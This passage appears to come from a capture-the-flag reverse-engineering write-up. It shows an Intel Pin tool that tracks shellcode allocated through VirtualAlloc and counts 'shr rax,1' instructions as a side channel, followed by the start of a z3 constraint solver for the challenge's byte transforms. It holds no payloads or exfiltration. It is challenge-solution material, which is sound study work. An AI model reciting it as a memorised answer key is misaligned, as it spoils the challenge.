<span class="number">0</span>;</span><br><span class="line">    ADDRINT last_va_size = <span class="number">0</span>;</span><br><span class="line">    UINT64 shr_cnt = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> TLS_KEY g_tls;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> std::string <span class="title">ToLower</span><span class="params">(std::string s)</span> </span>&#123;</span><br><span class="line">    std::<span class="built_in">transform</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), s.<span class="built_in">begin</span>(), [](<span class="type">unsigned</span> <span class="type">char</span> c)&#123; <span class="built_in">return</span> (<span class="type">char</span>)std::<span class="built_in">tolower</span>(c); &#125;);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> TData* <span class="title">GetTD</span><span class="params">(THREADID tid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">reinterpret_cast</span>&lt;TData*&gt;(<span class="built_in">PIN_GetThreadData</span>(g_tls, tid));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ThreadStart</span><span class="params">(THREADID tid, CONTEXT* <span class="comment">/*ctxt*/</span>, INT32 <span class="comment">/*flags*/</span>, VOID* <span class="comment">/*v*/</span>)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="keyword">new</span> <span class="built_in">TData</span>();</span><br><span class="line">    <span class="built_in">PIN_SetThreadData</span>(g_tls, td, tid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ThreadFini</span><span class="params">(THREADID tid, <span class="type">const</span> CONTEXT* <span class="comment">/*ctxt*/</span>, INT32 <span class="comment">/*code*/</span>, VOID* <span class="comment">/*v*/</span>)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (td) &#123;</span><br><span class="line">        <span class="built_in">PIN_GetLock</span>(&amp;g_lock, <span class="number">1</span>);</span><br><span class="line">        g_total_shr_rax1 += td-&gt;shr_cnt;</span><br><span class="line">        <span class="built_in">PIN_ReleaseLock</span>(&amp;g_lock);</span><br><span class="line">        <span class="keyword">delete</span> td;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">VA_Before</span><span class="params">(THREADID tid, ADDRINT <span class="comment">/*lpAddress*/</span>, ADDRINT dwSize, ADDRINT <span class="comment">/*flAllocationType*/</span>, ADDRINT <span class="comment">/*flProtect*/</span>)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;last_va_size = dwSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">VA_After</span><span class="params">(THREADID tid, ADDRINT ret)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;last_va_base = ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">EnterShellcode</span><span class="params">(THREADID tid, ADDRINT shell_entry, ADDRINT <span class="comment">/*ip*/</span>)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;in_sc = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (td-&gt;last_va_base == shell_entry &amp;&amp; td-&gt;last_va_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        td-&gt;sc_lo = td-&gt;last_va_base;</span><br><span class="line">        td-&gt;sc_hi = td-&gt;last_va_base + td-&gt;last_va_size;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        td-&gt;sc_lo = shell_entry;</span><br><span class="line">        td-&gt;sc_hi = shell_entry + <span class="number">0x200000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ExitShellcode</span><span class="params">(THREADID tid)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;in_sc = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> ADDRINT <span class="title">ShouldCount</span><span class="params">(THREADID tid, ADDRINT ip)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!td-&gt;in_sc) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ip &lt; td-&gt;sc_lo || ip &gt;= td-&gt;sc_hi) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">IncShrCount</span><span class="params">(THREADID tid)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;shr_cnt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">IsShrRax1</span><span class="params">(INS ins)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">INS_Opcode</span>(ins) != XED_ICLASS_SHR) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">INS_OperandCount</span>(ins) &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">INS_OperandIsReg</span>(ins, <span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">INS_OperandReg</span>(ins, <span class="number">0</span>) != REG_RAX) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">INS_OperandCount</span>(ins) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">INS_OperandIsImmediate</span>(ins, <span class="number">1</span>)) &#123;</span><br><span class="line">            ADDRINT imm = <span class="built_in">INS_OperandImmediate</span>(ins, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ((imm &amp; <span class="number">0xFF</span>) == <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ImageLoad</span><span class="params">(IMG img, VOID* <span class="comment">/*v*/</span>)</span> </span>&#123;</span><br><span class="line">    std::string name = <span class="built_in">ToLower</span>(<span class="built_in">IMG_Name</span>(img));</span><br><span class="line">    RTN va = <span class="built_in">RTN_FindByName</span>(img, <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RTN_Valid</span>(va)) &#123;</span><br><span class="line">        <span class="built_in">RTN_Open</span>(va);</span><br><span class="line">        <span class="built_in">RTN_InsertCall</span>(va, IPOINT_BEFORE, (AFUNPTR)VA_Before,</span><br><span class="line">                       IARG_THREAD_ID,</span><br><span class="line">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">0</span>,</span><br><span class="line">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">1</span>,</span><br><span class="line">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">2</span>,</span><br><span class="line">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">3</span>,</span><br><span class="line">                       IARG_END);</span><br><span class="line">        <span class="built_in">RTN_InsertCall</span>(va, IPOINT_AFTER, (AFUNPTR)VA_After,</span><br><span class="line">                       IARG_THREAD_ID,</span><br><span class="line">                       IARG_FUNCRET_EXITPOINT_VALUE,</span><br><span class="line">                       IARG_END);</span><br><span class="line">        <span class="built_in">RTN_Close</span>(va);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (name.<span class="built_in">find</span>(<span class="string">&quot;doll.dll&quot;</span>) != std::string::npos) &#123;</span><br><span class="line">        ADDRINT base = <span class="built_in">IMG_LowAddress</span>(img);</span><br><span class="line">        UINT64 rva = KnobCallRva.<span class="built_in">Value</span>();</span><br><span class="line">        g_callsite = base + (ADDRINT)rva;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">Instruction</span><span class="params">(INS ins, VOID* <span class="comment">/*v*/</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_callsite != <span class="number">0</span> &amp;&amp; <span class="built_in">INS_Address</span>(ins) == g_callsite) &#123;</span><br><span class="line">        <span class="built_in">INS_InsertCall</span>(ins, IPOINT_BEFORE, (AFUNPTR)EnterShellcode,</span><br><span class="line">                       IARG_THREAD_ID,</span><br><span class="line">                       IARG_REG_VALUE, REG_RSI,</span><br><span class="line">                       IARG_INST_PTR,</span><br><span class="line">                       IARG_END);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">INS_IsValidForIpointAfter</span>(ins)) &#123;</span><br><span class="line">            <span class="built_in">INS_InsertCall</span>(ins, IPOINT_AFTER, (AFUNPTR)ExitShellcode,</span><br><span class="line">                           IARG_THREAD_ID,</span><br><span class="line">                           IARG_END);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsShrRax1</span>(ins)) &#123;</span><br><span class="line">        <span class="built_in">INS_InsertIfCall</span>(ins, IPOINT_BEFORE, (AFUNPTR)ShouldCount,</span><br><span class="line">                         IARG_THREAD_ID,</span><br><span class="line">                         IARG_INST_PTR,</span><br><span class="line">                         IARG_END);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">INS_InsertThenCall</span>(ins, IPOINT_BEFORE, (AFUNPTR)IncShrCount,</span><br><span class="line">                           IARG_THREAD_ID,</span><br><span class="line">                           IARG_END);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">Fini</span><span class="params">(INT32 <span class="comment">/*code*/</span>, VOID* <span class="comment">/*v*/</span>)</span> </span>&#123;</span><br><span class="line">    FILE* fp = std::<span class="built_in">fopen</span>(KnobOut.<span class="built_in">Value</span>().<span class="built_in">c_str</span>(), <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span>;</span><br><span class="line">    std::<span class="built_in">fprintf</span>(fp, <span class="string">&quot;%llu\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)g_total_shr_rax1);</span><br><span class="line">    std::<span class="built_in">fclose</span>(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">PIN_InitSymbols</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">PIN_Init</span>(argc, argv)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    g_tls = <span class="built_in">PIN_CreateThreadDataKey</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_InitLock</span>(&amp;g_lock);</span><br><span class="line">    <span class="built_in">IMG_AddInstrumentFunction</span>(ImageLoad, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">INS_AddInstrumentFunction</span>(Instruction, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_AddThreadStartFunction</span>(ThreadStart, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_AddThreadFiniFunction</span>(ThreadFini, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_AddFiniFunction</span>(Fini, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">PIN_StartProgram</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Autore:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span>, <span class="type">Optional</span>, <span class="type">List</span>, <span class="type">Any</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> (</span><br><span class="line">    BitVec, BitVecVal, Solver, sat, LShR, ULT, UGE, And, If, Or, Extract</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">K0 = [<span class="number">180</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">75</span>, <span class="number">204</span>, <span class="number">8</span>, <span class="number">85</span>]</span><br><span class="line">LO_IDX = [<span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">N_QWORDS = <span class="number">4</span></span><br><span class="line">BYTES_PER_Q = <span class="number">8</span></span><br><span class="line">TOTAL_BYTES = N_QWORDS * BYTES_PER_Q</span><br><span class="line">TOTAL_BITS = TOTAL_BYTES * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bv8</span>(<span class="params">x: <span class="built_in">int</span></span>): <span class="keyword">return</span> BitVecVal(x &amp; <span class="number">0xFF</span>, <span class="number">8</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A_z</span>(<span class="params">x</span>): <span class="keyword">return</span> (x &lt;&lt; <span class="number">4</span>) &amp; bv8(<span class="number">0xFF</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">B_z</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ LShR(x, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">C_z</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ ((x &lt;&lt; <span class="number">2</span>) &amp; bv8(<span class="number">0xFF</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">D_z</span>(<span class="params">x</span>): <span class="keyword">return</span> (x &lt;&lt; <span class="number">1</span>) &amp; bv8(<span class="number">0xFF</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E_z</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ ((x &lt;&lt; <span class="number">4</span>) &amp; bv8(<span class="number">0xFF</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T_z</span>(<span class="params">state8</span>):</span><br><span class="line">    To = [bv8(<span class="number">0</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        x = state8[i]</span><br><span class="line">        idx1 = (i + <span class="number">4</span>) &amp; <span class="number">7</span></span><br><span class="line">        idx2 = LO_IDX[i]</span><br><span class="line">        cond_lt80 = ULT(x, bv8(<span class="number">0x80</span>))</span><br><span class="line">        cond_lt40 = ULT(x, bv8(<span class="number">0x40</span>))</span><br><span class="line">        cond_40_80 = And(UGE(x, bv8(<span class="number">0x40</span>)), ULT(x, bv8(<span class="number">0x80</span>)))</span><br><span class="line">        cond_geC0 = UGE(x, bv8(<span class="number">0xC0</span>))</span><br><span class="line">        To[idx1] = To[idx1] ^ If(cond_lt80, bv8(<span class="number">1</span>), bv8(<span class="number">0</span>))</span><br><span class="line">        v2 = If(cond_lt40, bv8(<span class="number">2</span>), If(cond_40_80, bv8(<span class="number">3</span>), If(cond_geC0, bv8(<span class="number">1</span>), bv8(<span class="number">0</span>))))</span><br><span class="line">        To[idx2] = To[idx2] ^ v2</span><br><span class="line">    <span 